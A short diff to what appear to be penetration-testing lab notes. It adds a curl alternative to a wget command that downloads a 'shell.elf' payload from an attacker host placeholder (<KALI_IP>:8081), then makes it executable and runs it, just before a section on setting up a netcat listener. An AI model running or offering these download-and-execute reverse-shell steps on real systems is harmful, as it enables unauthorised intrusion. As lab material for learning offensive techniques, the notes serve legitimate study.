@@ -32,8 +32,12 @@ python -m http.server 8081
 
   # Linux
   wget http://<KALI_IP>:8081/shell.elf
+  ## or
+  curl --output shell.elf http://<KALI_IP>:8081/shell.elf
+
   chmod +x shell.elf
   ./shell.elf
+
 ```
 
 ## Setup a netcat listener on Kali
